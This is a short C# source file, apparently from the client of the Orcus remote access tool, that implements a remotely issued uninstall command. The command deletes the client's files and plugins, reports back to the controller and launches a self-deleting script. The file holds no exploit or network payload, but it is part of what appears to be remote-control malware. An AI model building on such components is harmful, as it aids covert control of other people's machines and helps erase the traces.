using System;
using System.Diagnostics;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands;

public class UninstallCommandEx : UninstallCommand
{
	public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
	{
		UninstallHelper.RemoveAllDependencies();
		UninstallHelper.RemovePrivateFiles();
		UninstallHelper.RemoveOtherStuff();
		UninstallHelper.UninstallPlugins();
		try
		{
			UninstallHelper.PrepareOrcusFileToRemove();
		}
		catch (Exception ex)
		{
			feedbackFactory.Failed(string.Concat(ex, ": ", ex.Message));
			return;
		}
		ProcessStartInfo applicationDeletingScript = UninstallHelper.GetApplicationDeletingScript();
		feedbackFactory.Succeeded();
		Program.Unload();
		Process.Start(applicationDeletingScript);
		Program.Exit();
	}
}
